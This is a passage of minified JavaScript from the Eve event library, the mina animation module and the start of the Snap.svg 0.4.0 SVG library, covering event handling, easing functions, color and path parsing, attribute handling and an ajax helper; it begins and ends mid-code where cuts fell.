e,i,n,o,s,a,d,c,u=t.split(r),h=l,p=[h],f=[];for(o=0,s=u.length;s>o;o++){for(c=[],a=0,d=p.length;d>a;a++)for(i=[(h=p[a].n)[u[o]],h["*"]],n=2;n--;)(e=i[n])&&(c.push(e),f=f.concat(e.f||[]));p=c}return f},u.on=function(t,e){if(t=String(t),"function"!=typeof e)return function(){};for(var i=t.split(s),n=0,o=i.length;o>n;n++)!function(t){for(var i,n=t.split(r),o=l,s=0,a=n.length;a>s;s++)o=(o=o.n).hasOwnProperty(n[s])&&o[n[s]]||(o[n[s]]={n:{}});for(o.f=o.f||[],s=0,a=o.f.length;a>s;s++)if(o.f[s]==e){i=!0;break}!i&&o.f.push(e)}(i[n]);return function(t){+t==+t&&(e.zIndex=+t)}},u.f=function(t){var e=[].slice.call(arguments,1);return function(){u.apply(null,[t,null].concat(e).concat([].slice.call(arguments,0)))}},u.stop=function(){i=1},u.nt=function(t){return t?new RegExp("(?:\\.|\\/|^)"+t+"(?:\\.|\\/|$)").test(e):e},u.nts=function(){return e.split(r)},u.off=u.unbind=function(t,e){if(t){var i=t.split(s);if(i.length>1)for(var n=0,a=i.length;a>n;n++)u.off(i[n],e);else{i=t.split(r);var d,c,h,p,f,g=[l];for(n=0,a=i.length;a>n;n++)for(p=0;p<g.length;p+=h.length-2){if(h=[p,1],d=g[p].n,"*"!=i[n])d[i[n]]&&h.push(d[i[n]]);else for(c in d)d[o](c)&&h.push(d[c]);g.splice.apply(g,h)}for(n=0,a=g.length;a>n;n++)for(d=g[n];d.n;){if(e){if(d.f){for(p=0,f=d.f.length;f>p;p++)if(d.f[p]==e){d.f.splice(p,1);break}!d.f.length&&delete d.f}for(c in d.n)if(d.n[o](c)&&d.n[c].f){var m=d.n[c].f;for(p=0,f=m.length;f>p;p++)if(m[p]==e){m.splice(p,1);break}!m.length&&delete d.n[c].f}}else for(c in delete d.f,d.n)d.n[o](c)&&d.n[c].f&&delete d.n[c].f;d=d.n}}}else u._events=l={n:{}}},u.once=function(t,e){var i=function(){return u.unbind(t,i),e.apply(this,arguments)};return u.on(t,i)},u.version=n,u.toString=function(){return"You are running Eve "+n},"undefined"!=typeof module&&module.exports?module.exports=u:"function"==typeof define&&define.amd?define("eve",[],(function(){return u})):t.eve=u}(this),function(t,e){if("function"==typeof define&&define.amd)define(["eve"],(function(i){return e(t,i)}));else if("undefined"!=typeof exports){var i=require("eve");module.exports=e(t,i)}else e(t,t.eve)}(window||this,(function(t,e){var i=function(e){var i={},n=t.requestAnimationFrame||t.webkitRequestAnimationFrame||t.mozRequestAnimationFrame||t.oRequestAnimationFrame||t.msRequestAnimationFrame||function(t){setTimeout(t,16)},o=Array.isArray||function(t){return t instanceof Array||"[object Array]"==Object.prototype.toString.call(t)},r=0,s="M"+(+new Date).toString(36),a=function(){return s+(r++).toString(36)},l=Date.now||function(){return+new Date},d=function(t){var e=this;if(null==t)return e.s;var i=e.s-t;e.b+=e.dur*i,e.B+=e.dur*i,e.s=t},c=function(t){return null==t?this.spd:void(this.spd=t)},u=function(t){var e=this;return null==t?e.dur:(e.s=e.s*t/e.dur,void(e.dur=t))},h=function(){var t=this;delete i[t.id],t.update(),e("mina.stop."+t.id,t)},p=function(){var t=this;t.pdif||(delete i[t.id],t.update(),t.pdif=t.get()-t.b)},f=function(){var t=this;t.pdif&&(t.b=t.get()-t.pdif,delete t.pdif,i[t.id]=t)},g=function(){var t,e=this;if(o(e.start)){t=[];for(var i=0,n=e.start.length;n>i;i++)t[i]=+e.start[i]+(e.end[i]-e.start[i])*e.easing(e.s)}else t=+e.start+(e.end-e.start)*e.easing(e.s);e.set(t)},m=function(){var t=0;for(var o in i)if(i.hasOwnProperty(o)){var r=i[o],s=r.get();t++,r.s=(s-r.b)/(r.dur/r.spd),r.s>=1&&(delete i[o],r.s=1,t--,function(t){setTimeout((function(){e("mina.finish."+t.id,t)}))}(r)),r.update()}t&&n(m)},v=function(t,e,o,r,s,l,y){var b={id:a(),start:t,end:e,b:o,s:0,dur:r-o,spd:1,get:s,set:l,easing:y||v.linear,status:d,speed:c,duration:u,stop:h,pause:p,resume:f,update:g};i[b.id]=b;var x,w=0;for(x in i)if(i.hasOwnProperty(x)&&2==++w)break;return 1==w&&n(m),b};return v.time=l,v.getById=function(t){return i[t]||null},v.linear=function(t){return t},v.easeout=function(t){return Math.pow(t,1.7)},v.easein=function(t){return Math.pow(t,.48)},v.easeinout=function(t){if(1==t)return 1;if(0==t)return 0;var e=.48-t/1.04,i=Math.sqrt(.1734+e*e),n=i-e,o=-i-e,r=Math.pow(Math.abs(n),1/3)*(0>n?-1:1)+Math.pow(Math.abs(o),1/3)*(0>o?-1:1)+.5;return 3*(1-r)*r*r+r*r*r},v.backin=function(t){if(1==t)return 1;var e=1.70158;return t*t*((e+1)*t-e)},v.backout=function(t){if(0==t)return 0;var e=1.70158;return(t-=1)*t*((e+1)*t+e)+1},v.elastic=function(t){return t==!!t?t:Math.pow(2,-10*t)*Math.sin(2*(t-.075)*Math.PI/.3)+1},v.bounce=function(t){var e=7.5625,i=2.75;return 1/i>t?e*t*t:2/i>t?e*(t-=1.5/i)*t+.75:2.5/i>t?e*(t-=2.25/i)*t+.9375:e*(t-=2.625/i)*t+.984375},t.mina=v,v}(void 0===e?function(){}:e),n=function(t){function i(t,e){if(t){if(t.nodeType)return p(t);if(o(t,"array")&&i.set)return i.set.apply(i,t);if(t instanceof d)return t;if(null==e)return p(t=f.doc.querySelector(String(t)))}return new h(t=null==t?"100%":t,e=null==e?"100%":e)}function n(t,e){if(e){if("#text"==t&&(t=f.doc.createTextNode(e.text||e["#text"]||"")),"#comment"==t&&(t=f.doc.createComment(e.text||e["#text"]||"")),"string"==typeof t&&(t=n(t)),"string"==typeof e)return 1==t.nodeType?"xlink:"==e.substring(0,6)?t.getAttributeNS(z,e.substring(6)):"xml:"==e.substring(0,4)?t.getAttributeNS(N,e.substring(4)):t.getAttribute(e):"text"==e?t.nodeValue:null;if(1==t.nodeType){for(var i in e)if(e[m](i)){var o=v(e[i]);o?"xlink:"==i.substring(0,6)?t.setAttributeNS(z,i.substring(6),o):"xml:"==i.substring(0,4)?t.setAttributeNS(N,i.substring(4),o):t.setAttribute(i,o):t.removeAttribute(i)}}else"text"in e&&(t.nodeValue=e.text)}else t=f.doc.createElementNS(N,t);return t}function o(t,e){return"finite"==(e=v.prototype.toLowerCase.call(e))?isFinite(t):!("array"!=e||!(t instanceof Array||Array.isArray&&Array.isArray(t)))||"null"==e&&null===t||e==typeof t&&null!==t||"object"==e&&t===Object(t)||$.call(t).slice(8,-1).toLowerCase()==e}function r(t,e,i){return function n(){var o=Array.prototype.slice.call(arguments,0),r=o.join("␀"),s=n.cache=n.cache||{},a=n.count=n.count||[];return s[m](r)?(function(t,e){for(var i=0,n=t.length;n>i;i++)if(t[i]===e)return t.push(t.splice(i,1)[0])}(a,r),i?i(s[r]):s[r]):(a.length>=1e3&&delete s[a.shift()],a.push(r),s[r]=t.apply(e,o),i?i(s[r]):s[r])}}function s(t){return t%360*C/180}function a(t){return t.node.ownerSVGElement&&p(t.node.ownerSVGElement)||i.select("svg")}function l(t){o(t,"array")||(t=Array.prototype.slice.call(arguments,0));for(var e=0,i=0,n=this.node;this[e];)delete this[e++];for(e=0;e<t.length;e++)"set"==t[e].type?t[e].forEach((function(t){n.appendChild(t.node)})):n.appendChild(t[e].node);var r=n.childNodes;for(e=0;e<r.length;e++)this[i++]=p(r[e]);return this}function d(t){if(t.snap in B)return B[t.snap];var e;try{e=t.ownerSVGElement}catch(t){}this.node=t,e&&(this.paper=new h(e)),this.type=t.tagName||t.nodeName;var i=this.id=O(this);if(this.anims={},this._={transform:[]},t.snap=i,B[i]=this,"g"==this.type&&(this.add=l),this.type in{g:1,mask:1,pattern:1,symbol:1})for(var n in h.prototype)h.prototype[m](n)&&(this[n]=h.prototype[n])}function c(t){this.node=t}function u(t,e){var i=n(t);return e.appendChild(i),p(i)}function h(t,e){var i,o,r,s=h.prototype;if(t&&"svg"==t.tagName){if(t.snap in B)return B[t.snap];var a=t.ownerDocument;for(var l in i=new d(t),o=t.getElementsByTagName("desc")[0],r=t.getElementsByTagName("defs")[0],o||((o=n("desc")).appendChild(a.createTextNode("Created with Snap")),i.node.appendChild(o)),r||(r=n("defs"),i.node.appendChild(r)),i.defs=r,s)s[m](l)&&(i[l]=s[l]);i.paper=i.root=i}else n((i=u("svg",f.doc.body)).node,{height:e,version:1.1,width:t,xmlns:N});return i}function p(t){return t?t instanceof d||t instanceof c?t:t.tagName&&"svg"==t.tagName.toLowerCase()?new h(t):t.tagName&&"object"==t.tagName.toLowerCase()&&"image/svg+xml"==t.type?new h(t.contentDocument.getElementsByTagName("svg")[0]):new d(t):t}i.version="0.4.0",i.toString=function(){return"Snap v"+this.version},i._={};var f={win:t.window,doc:t.window.document};i._.glob=f;var m="hasOwnProperty",v=String,y=parseFloat,b=parseInt,x=Math,w=x.max,k=x.min,_=x.abs,C=(x.pow,x.PI),S=(x.round,""),$=Object.prototype.toString,T=/^\s*((#[a-f\d]{6})|(#[a-f\d]{3})|rgba?\(\s*([\d\.]+%?\s*,\s*[\d\.]+%?\s*,\s*[\d\.]+%?(?:\s*,\s*[\d\.]+%?)?)\s*\)|hsba?\(\s*([\d\.]+(?:deg|\xb0|%)?\s*,\s*[\d\.]+%?\s*,\s*[\d\.]+(?:%?\s*,\s*[\d\.]+)?%?)\s*\)|hsla?\(\s*([\d\.]+(?:deg|\xb0|%)?\s*,\s*[\d\.]+%?\s*,\s*[\d\.]+(?:%?\s*,\s*[\d\.]+)?%?)\s*\))\s*$/i,D=(i._.separator=/[,\s]+/,/[\s]*,[\s]*/),I={hs:1,rg:1},M=/([a-z])[\s,]*((-?\d*\.?\d*(?:e[\-+]?\d+)?[\s]*,?[\s]*)+)/gi,A=/([rstm])[\s,]*((-?\d*\.?\d*(?:e[\-+]?\d+)?[\s]*,?[\s]*)+)/gi,P=/(-?\d*\.?\d*(?:e[\-+]?\\d+)?)[\s]*,?[\s]*/gi,L=0,E="S"+(+new Date).toString(36),O=function(t){return(t&&t.type?t.type:S)+E+(L++).toString(36)},z="http://www.w3.org/1999/xlink",N="http://www.w3.org/2000/svg",B={};i.url=function(t){return"url('#"+t+"')"},i._.$=n,i._.id=O,i.format=function(){var t=/\{([^\}]+)\}/g,e=/(?:(?:^|\.)(.+?)(?=\[|\.|$|\()|\[('|")(.+?)\2\])(\(\))?/g,i=function(t,i,n){var o=n;return i.replace(e,(function(t,e,i,n,r){e=e||n,o&&(e in o&&(o=o[e]),"function"==typeof o&&r&&(o=o()))})),o=(null==o||o==n?t:o)+""};return function(e,n){return v(e).replace(t,(function(t,e){return i(t,e,n)}))}}(),i._.clone=function t(e){if("function"==typeof e||Object(e)!==e)return e;var i=new e.constructor;for(var n in e)e[m](n)&&(i[n]=t(e[n]));return i},i._.cacher=r,i.rad=s,i.deg=function(t){return 180*t/C%360},i.sin=function(t){return x.sin(i.rad(t))},i.tan=function(t){return x.tan(i.rad(t))},i.cos=function(t){return x.cos(i.rad(t))},i.asin=function(t){return i.deg(x.asin(t))},i.acos=function(t){return i.deg(x.acos(t))},i.atan=function(t){return i.deg(x.atan(t))},i.atan2=function(t){return i.deg(x.atan2(t))},i.angle=function t(e,i,n,o,r,s){if(null==r){var a=e-n,l=i-o;return a||l?(180+180*x.atan2(-l,-a)/C+360)%360:0}return t(e,i,r,s)-t(n,o,r,s)},i.len=function(t,e,n,o){return Math.sqrt(i.len2(t,e,n,o))},i.len2=function(t,e,i,n){return(t-i)*(t-i)+(e-n)*(e-n)},i.closestPoint=function(t,e,i){function n(t){var n=t.x-e,o=t.y-i;return n*n+o*o}for(var o,r,s,a,l=t.node,d=l.getTotalLength(),c=d/l.pathSegList.numberOfItems*.125,u=1/0,h=0;d>=h;h+=c)(a=n(s=l.getPointAtLength(h)))<u&&(o=s,r=h,u=a);for(c*=.5;c>.5;){var p,f,g,m,v,y;(g=r-c)>=0&&(v=n(p=l.getPointAtLength(g)))<u?(o=p,r=g,u=v):(m=r+c)<=d&&(y=n(f=l.getPointAtLength(m)))<u?(o=f,r=m,u=y):c*=.5}return{x:o.x,y:o.y,length:r,distance:Math.sqrt(u)}},i.is=o,i.snapTo=function(t,e,i){if(i=o(i,"finite")?i:10,o(t,"array")){for(var n=t.length;n--;)if(_(t[n]-e)<=i)return t[n]}else{var r=e%(t=+t);if(i>r)return e-r;if(r>t-i)return e-r+t}return e},i.getRGB=r((function(t){if(!t||(t=v(t)).indexOf("-")+1)return{r:-1,g:-1,b:-1,hex:"none",error:1,toString:R};if("none"==t)return{r:-1,g:-1,b:-1,hex:"none",toString:R};if(!(I[m](t.toLowerCase().substring(0,2))||"#"==t.charAt())&&(t=j(t)),!t)return{r:-1,g:-1,b:-1,hex:"none",error:1,toString:R};var e,n,r,s,a,l,d=t.match(T);return d?(d[2]&&(r=b(d[2].substring(5),16),n=b(d[2].substring(3,5),16),e=b(d[2].substring(1,3),16)),d[3]&&(r=b((a=d[3].charAt(3))+a,16),n=b((a=d[3].charAt(2))+a,16),e=b((a=d[3].charAt(1))+a,16)),d[4]&&(l=d[4].split(D),e=y(l[0]),"%"==l[0].slice(-1)&&(e*=2.55),n=y(l[1]),"%"==l[1].slice(-1)&&(n*=2.55),r=y(l[2]),"%"==l[2].slice(-1)&&(r*=2.55),"rgba"==d[1].toLowerCase().slice(0,4)&&(s=y(l[3])),l[3]&&"%"==l[3].slice(-1)&&(s/=100)),d[5]?(l=d[5].split(D),e=y(l[0]),"%"==l[0].slice(-1)&&(e/=100),n=y(l[1]),"%"==l[1].slice(-1)&&(n/=100),r=y(l[2]),"%"==l[2].slice(-1)&&(r/=100),("deg"==l[0].slice(-3)||"°"==l[0].slice(-1))&&(e/=360),"hsba"==d[1].toLowerCase().slice(0,4)&&(s=y(l[3])),l[3]&&"%"==l[3].slice(-1)&&(s/=100),i.hsb2rgb(e,n,r,s)):d[6]?(l=d[6].split(D),e=y(l[0]),"%"==l[0].slice(-1)&&(e/=100),n=y(l[1]),"%"==l[1].slice(-1)&&(n/=100),r=y(l[2]),"%"==l[2].slice(-1)&&(r/=100),("deg"==l[0].slice(-3)||"°"==l[0].slice(-1))&&(e/=360),"hsla"==d[1].toLowerCase().slice(0,4)&&(s=y(l[3])),l[3]&&"%"==l[3].slice(-1)&&(s/=100),i.hsl2rgb(e,n,r,s)):(e=k(x.round(e),255),n=k(x.round(n),255),r=k(x.round(r),255),s=k(w(s,0),1),(d={r:e,g:n,b:r,toString:R}).hex="#"+(16777216|r|n<<8|e<<16).toString(16).slice(1),d.opacity=o(s,"finite")?s:1,d)):{r:-1,g:-1,b:-1,hex:"none",error:1,toString:R}}),i),i.hsb=r((function(t,e,n){return i.hsb2rgb(t,e,n).hex})),i.hsl=r((function(t,e,n){return i.hsl2rgb(t,e,n).hex})),i.rgb=r((function(t,e,i,n){if(o(n,"finite")){var r=x.round;return"rgba("+[r(t),r(e),r(i),+n.toFixed(2)]+")"}return"#"+(16777216|i|e<<8|t<<16).toString(16).slice(1)}));var j=function(t){var e=f.doc.getElementsByTagName("head")[0]||f.doc.getElementsByTagName("svg")[0],i="rgb(255, 0, 0)";return(j=r((function(t){if("red"==t.toLowerCase())return i;e.style.color=i,e.style.color=t;var n=f.doc.defaultView.getComputedStyle(e,S).getPropertyValue("color");return n==i?null:n})))(t)},F=function(){return"hsb("+[this.h,this.s,this.b]+")"},H=function(){return"hsl("+[this.h,this.s,this.l]+")"},R=function(){return 1==this.opacity||null==this.opacity?this.hex:"rgba("+[this.r,this.g,this.b,this.opacity]+")"},W=function(t,e,n){if(null==e&&o(t,"object")&&"r"in t&&"g"in t&&"b"in t&&(n=t.b,e=t.g,t=t.r),null==e&&o(t,string)){var r=i.getRGB(t);t=r.r,e=r.g,n=r.b}return(t>1||e>1||n>1)&&(t/=255,e/=255,n/=255),[t,e,n]},q=function(t,e,n,r){var s={r:t=x.round(255*t),g:e=x.round(255*e),b:n=x.round(255*n),opacity:o(r,"finite")?r:1,hex:i.rgb(t,e,n),toString:R};return o(r,"finite")&&(s.opacity=r),s};i.color=function(t){var e;return o(t,"object")&&"h"in t&&"s"in t&&"b"in t?(e=i.hsb2rgb(t),t.r=e.r,t.g=e.g,t.b=e.b,t.opacity=1,t.hex=e.hex):o(t,"object")&&"h"in t&&"s"in t&&"l"in t?(e=i.hsl2rgb(t),t.r=e.r,t.g=e.g,t.b=e.b,t.opacity=1,t.hex=e.hex):(o(t,"string")&&(t=i.getRGB(t)),o(t,"object")&&"r"in t&&"g"in t&&"b"in t&&!("error"in t)?(e=i.rgb2hsl(t),t.h=e.h,t.s=e.s,t.l=e.l,e=i.rgb2hsb(t),t.v=e.b):((t={hex:"none"}).r=t.g=t.b=t.h=t.s=t.v=t.l=-1,t.error=1)),t.toString=R,t},i.hsb2rgb=function(t,e,i,n){var r,s,a,l,d;return o(t,"object")&&"h"in t&&"s"in t&&"b"in t&&(i=t.b,e=t.s,n=t.o,t=t.h),l=(d=i*e)*(1-_((t=(t*=360)%360/60)%2-1)),r=s=a=i-d,q(r+=[d,l,0,0,l,d][t=~~t],s+=[l,d,d,l,0,0][t],a+=[0,0,l,d,d,l][t],n)},i.hsl2rgb=function(t,e,i,n){var r,s,a,l,d;return o(t,"object")&&"h"in t&&"s"in t&&"l"in t&&(i=t.l,e=t.s,t=t.h),(t>1||e>1||i>1)&&(t/=360,e/=100,i/=100),l=(d=2*e*(.5>i?i:1-i))*(1-_((t=(t*=360)%360/60)%2-1)),r=s=a=i-d/2,q(r+=[d,l,0,0,l,d][t=~~t],s+=[l,d,d,l,0,0][t],a+=[0,0,l,d,d,l][t],n)},i.rgb2hsb=function(t,e,i){var n,o;return t=(i=W(t,e,i))[0],e=i[1],i=i[2],{h:((0==(o=(n=w(t,e,i))-k(t,e,i))?null:n==t?(e-i)/o:n==e?(i-t)/o+2:(t-e)/o+4)+360)%6*60/360,s:0==o?0:o/n,b:n,toString:F}},i.rgb2hsl=function(t,e,i){var n,o,r,s;return t=(i=W(t,e,i))[0],e=i[1],i=i[2],n=((o=w(t,e,i))+(r=k(t,e,i)))/2,{h:((0==(s=o-r)?null:o==t?(e-i)/s:o==e?(i-t)/s+2:(t-e)/s+4)+360)%6*60/360,s:0==s?0:.5>n?s/(2*n):s/(2-2*n),l:n,toString:H}},i.parsePathString=function(t){if(!t)return null;var e=i.path(t);if(e.arr)return i.path.clone(e.arr);var n={a:7,c:6,o:2,h:1,l:2,m:2,r:4,q:4,s:4,t:2,v:1,u:3,z:0},r=[];return o(t,"array")&&o(t[0],"array")&&(r=i.path.clone(t)),r.length||v(t).replace(M,(function(t,e,i){var o=[],s=e.toLowerCase();if(i.replace(P,(function(t,e){e&&o.push(+e)})),"m"==s&&o.length>2&&(r.push([e].concat(o.splice(0,2))),s="l",e="m"==e?"l":"L"),"o"==s&&1==o.length&&r.push([e,o[0]]),"r"==s)r.push([e].concat(o));else for(;o.length>=n[s]&&(r.push([e].concat(o.splice(0,n[s]))),n[s]););})),r.toString=i.path.toString,e.arr=i.path.clone(r),r};var Y=i.parseTransformString=function(t){if(!t)return null;var e=[];return o(t,"array")&&o(t[0],"array")&&(e=i.path.clone(t)),e.length||v(t).replace(A,(function(t,i,n){var o=[];i.toLowerCase(),n.replace(P,(function(t,e){e&&o.push(+e)})),e.push([i].concat(o))})),e.toString=i.path.toString,e};i._.svgTransform2string=function(t){var e=[];return t=t.replace(/(?:^|\s)(\w+)\(([^)]+)\)/g,(function(t,i,n){return n=n.split(/\s*,\s*|\s+/),"rotate"==i&&1==n.length&&n.push(0,0),"scale"==i&&(n.length>2?n=n.slice(0,2):2==n.length&&n.push(0,0),1==n.length&&n.push(n[0],0,0)),e.push("skewX"==i?["m",1,0,x.tan(s(n[0])),1,0,0]:"skewY"==i?["m",1,x.tan(s(n[0])),0,1,0,0]:[i.charAt(0)].concat(n)),t})),e},i._.rgTransform=/^[a-z][\s]*-?\.?\d/i,i._.transform2matrix=function(t,e){var n=Y(t),o=new i.Matrix;if(n)for(var r=0,s=n.length;s>r;r++){var a,l,d,c,u,h=n[r],p=h.length,f=v(h[0]).toLowerCase(),g=h[0]!=f,m=g?o.invert():0;"t"==f&&2==p?o.translate(h[1],0):"t"==f&&3==p?g?(a=m.x(0,0),l=m.y(0,0),d=m.x(h[1],h[2]),c=m.y(h[1],h[2]),o.translate(d-a,c-l)):o.translate(h[1],h[2]):"r"==f?2==p?(u=u||e,o.rotate(h[1],u.x+u.width/2,u.y+u.height/2)):4==p&&(g?(d=m.x(h[2],h[3]),c=m.y(h[2],h[3]),o.rotate(h[1],d,c)):o.rotate(h[1],h[2],h[3])):"s"==f?2==p||3==p?(u=u||e,o.scale(h[1],h[p-1],u.x+u.width/2,u.y+u.height/2)):4==p?g?(d=m.x(h[2],h[3]),c=m.y(h[2],h[3]),o.scale(h[1],h[1],d,c)):o.scale(h[1],h[1],h[2],h[3]):5==p&&(g?(d=m.x(h[3],h[4]),c=m.y(h[3],h[4]),o.scale(h[1],h[2],d,c)):o.scale(h[1],h[2],h[3],h[4])):"m"==f&&7==p&&o.add(h[1],h[2],h[3],h[4],h[5],h[6])}return o},i._unit2px=function(t,e,i){function o(t){if(null==t)return S;if(t==+t)return t;n(c,{width:t});try{return c.getBBox().width}catch(t){return 0}}function r(t){if(null==t)return S;if(t==+t)return t;n(c,{height:t});try{return c.getBBox().height}catch(t){return 0}}function s(n,o){null==e?d[n]=o(t.attr(n)||0):n==e&&(d=o(null==i?t.attr(n)||0:i))}var l=a(t).node,d={},c=l.querySelector(".svg---mgr");switch(c||(c=n("rect"),n(c,{x:-9e9,y:-9e9,width:10,height:10,class:"svg---mgr",fill:"none"}),l.appendChild(c)),t.type){case"rect":s("rx",o),s("ry",r);case"image":s("width",o),s("height",r);case"text":s("x",o),s("y",r);break;case"circle":s("cx",o),s("cy",r),s("r",o);break;case"ellipse":s("cx",o),s("cy",r),s("rx",o),s("ry",r);break;case"line":s("x1",o),s("x2",o),s("y1",r),s("y2",r);break;case"marker":s("refX",o),s("markerWidth",o),s("refY",r),s("markerHeight",r);break;case"radialGradient":s("fx",o),s("fy",r);break;case"tspan":s("dx",o),s("dy",r);break;default:s(e,o)}return l.removeChild(c),d},f.doc.contains||f.doc.compareDocumentPosition,i._.getSomeDefs=function(t){var e=t.node.ownerSVGElement&&p(t.node.ownerSVGElement)||t.node.parentNode&&p(t.node.parentNode)||i.select("svg")||i(0,0),n=e.select("defs"),o=null!=n&&n.node;return o||(o=u("defs",e.node).node),o},i._.getSomeSVG=a,i.select=function(t){return t=v(t).replace(/([^\\]):/g,"$1\\:"),p(f.doc.querySelector(t))},i.selectAll=function(t){for(var e=f.doc.querySelectorAll(t),n=(i.set||Array)(),o=0;o<e.length;o++)n.push(p(e[o]));return n},setInterval((function(){for(var t in B)if(B[m](t)){var e=B[t],i=e.node;("svg"!=e.type&&!i.ownerSVGElement||"svg"==e.type&&(!i.parentNode||"ownerSVGElement"in i.parentNode&&!i.ownerSVGElement))&&delete B[t]}}),1e4),d.prototype.attr=function(t,i){var n=this,r=n.node;if(!t){if(1!=r.nodeType)return{text:r.nodeValue};for(var s=r.attributes,a={},l=0,d=s.length;d>l;l++)a[s[l].nodeName]=s[l].nodeValue;return a}if(o(t,"string")){if(!(arguments.length>1))return e("snap.util.getattr."+t,n).firstDefined();var c={};c[t]=i,t=c}for(var u in t)t[m](u)&&e("snap.util.attr."+u,n,t[u]);return n},i.parse=function(t){var e=f.doc.createDocumentFragment(),i=!0,n=f.doc.createElement("div");if((t=v(t)).match(/^\s*<\s*svg(?:\s|>)/)||(t="<svg>"+t+"</svg>",i=!1),n.innerHTML=t,t=n.getElementsByTagName("svg")[0])if(i)e=t;else for(;t.firstChild;)e.appendChild(t.firstChild);return new c(e)},i.fragment=function(){for(var t=Array.prototype.slice.call(arguments,0),e=f.doc.createDocumentFragment(),n=0,o=t.length;o>n;n++){var r=t[n];r.node&&r.node.nodeType&&e.appendChild(r.node),r.nodeType&&e.appendChild(r),"string"==typeof r&&e.appendChild(i.parse(r).node)}return new c(e)},i._.make=u,i._.wrap=p,h.prototype.el=function(t,e){var i=u(t,this.node);return e&&i.attr(e),i},d.prototype.children=function(){for(var t=[],e=this.node.childNodes,n=0,o=e.length;o>n;n++)t[n]=i(e[n]);return t},d.prototype.toJSON=function(){var t=[];return function t(e,i){for(var n=0,o=e.length;o>n;n++){var r={type:e[n].type,attr:e[n].attr()},s=e[n].children();i.push(r),s.length&&t(s,r.childNodes=[])}}([this],t),t[0]},e.on("snap.util.getattr",(function(){var t=e.nt(),i=(t=t.substring(t.lastIndexOf(".")+1)).replace(/[A-Z]/g,(function(t){return"-"+t.toLowerCase()}));return U[m](i)?this.node.ownerDocument.defaultView.getComputedStyle(this.node,null).getPropertyValue(i):n(this.node,t)}));var U={"alignment-baseline":0,"baseline-shift":0,clip:0,"clip-path":0,"clip-rule":0,color:0,"color-interpolation":0,"color-interpolation-filters":0,"color-profile":0,"color-rendering":0,cursor:0,direction:0,display:0,"dominant-baseline":0,"enable-background":0,fill:0,"fill-opacity":0,"fill-rule":0,filter:0,"flood-color":0,"flood-opacity":0,font:0,"font-family":0,"font-size":0,"font-size-adjust":0,"font-stretch":0,"font-style":0,"font-variant":0,"font-weight":0,"glyph-orientation-horizontal":0,"glyph-orientation-vertical":0,"image-rendering":0,kerning:0,"letter-spacing":0,"lighting-color":0,marker:0,"marker-end":0,"marker-mid":0,"marker-start":0,mask:0,opacity:0,overflow:0,"pointer-events":0,"shape-rendering":0,"stop-color":0,"stop-opacity":0,stroke:0,"stroke-dasharray":0,"stroke-dashoffset":0,"stroke-linecap":0,"stroke-linejoin":0,"stroke-miterlimit":0,"stroke-opacity":0,"stroke-width":0,"text-anchor":0,"text-decoration":0,"text-rendering":0,"unicode-bidi":0,visibility:0,"word-spacing":0,"writing-mode":0};e.on("snap.util.attr",(function(t){var i=e.nt(),o={};o[i=i.substring(i.lastIndexOf(".")+1)]=t;var r=i.replace(/-(\w)/gi,(function(t,e){return e.toUpperCase()})),s=i.replace(/[A-Z]/g,(function(t){return"-"+t.toLowerCase()}));U[m](s)?this.node.style[r]=null==t?S:t:n(this.node,o)})),h.prototype,i.ajax=function(t,i,n,r){var s=new XMLHttpRequest,a=O();if(s){if(o(i,"function"))r=n,n=i,i=null;else if(o(i,"object")){var l=[];for(var d in i)i.hasOwnProperty(d)&&l.push(encodeURIComponent(d)+"="+encodeURIComponent(i[d]));i=l.join("&")}return s.open(i?"POST":"GET",t,!0),i&&(s.setRequestHeader("X-Requested-With","XMLHttpRequest"),s.setRequestHeader("Content-type","application/x-www-form-urlencoded")),n&&(e.once("snap.ajax."+a+".0",n),e.once("snap.ajax."+a+".200",n),e.once("snap.ajax."+a+".304",n)),s.onreadystatechange=function(){4==s.readyState&&e("snap.ajax."+a+"."+s.status,r,s)},4==s.readyState||s.send(i),s}},i.load=function(t,e,n){i.ajax(t,(function(t){var o=i.parse(t.responseText);n?e.call(n,o):e(o)}))};return i.getElementByPoint=function(t,e){var i=(this.canvas,f.doc.elementFromPoint(t,e));if(f.win.opera&&"svg"==i.tagName){var n=function(t){var e=t.getBoundingClientRect(),i=t.ownerDocument,n=i.body,o=i.documentElement,r=o.clientTop||n.clientTop||0,s=o.clientLeft||n.clientLeft||0;return{y:e.top+(g.win.pageYOffset||o.scrollTop||n.scrollTop)-r,x:e.left+(g.win.pageXOffset||o.scrollLeft||n.scrollLeft)-s}}(i),o=i.createSVGRect();o.x=t-n.x,o.y=e-n.y,o.width=o.height=1;var r=i.getIntersectionList(o,null);r.length&&(i=r[r.length-1])}return i?p(i):null},i.plugin=function(t){t(i,d,h,f,c)},f.win.Snap=i,i}(t||this);return n.plugin((function(n,o,r,s,a){function l(t,e){if(null==e){var i=!0;if(!(e=t.node.getAttribute("linearGradient"==t.type||"radialGradient"==t.type?"gradientTransform":"pattern"==t.type?"patternTransform":"transform")))return new n.Matrix;e=n._.svgTransform2string(e)}else e=n._.rgTransform.test(e)?p(e).replace(/\.{3}|\u2026/g,t._.transform||""):n._.svgTransform2string(e),h(e,"array")&&(e=n.path?n.path.toString.call(e):p(e)),t._.transform=e;var o=n._.transform2matrix(e,t.getBBox(1));return i?o:void(t.matrix=o)}function d(t,e,i){return function(n){var o=n.slice(t,e);return 1==o.length&&(o=o[0]),i?i(o):o}}function c(t){return function(){var e=t?"<"+this.type:"",i=this.node.attributes,n=this.node.childNodes;if(t)for(var o=0,r=i.length;r>o;o++)e+=" "+i[o].name+'="'+i[o].value.replace(/"/g,'\\"')+'"';if(n.length){for(t&&(e+=">"),o=0,r=n.length;r>o;o++)3==n[o].nodeType?e+=n[o].nodeValue:1==n[o].nodeType&&(e+=b(n[o]).toString());t&&(e+="</"+this.type+">")}else t&&(e+="/>");return e}}var u=o.prototype,h=n.is,p=String,f=n._unit2px,g=n._.$,m=n._.make,v=n._.getSomeDefs,y="hasOwnProperty",b=n._.wrap;u.getBBox=function(t){if(!n.Matrix||!n.path)return this.node.getBBox();var e=this,i=new n.Matrix;if(e.removed)return n._.box();for(;"use"==e.type;)if(t||(i=i.add(e.transform().localMatrix.translate(e.attr("x")||0,e.attr("y")||0))),e.original)e=e.original;else{var o=e.attr("xlink:href");e=e.original=e.node.ownerDocument.getElementById(o.substring(o.indexOf("#")+1))}var r=e._,s=n.path.get[e.type]||n.path.get.deflt;try{return 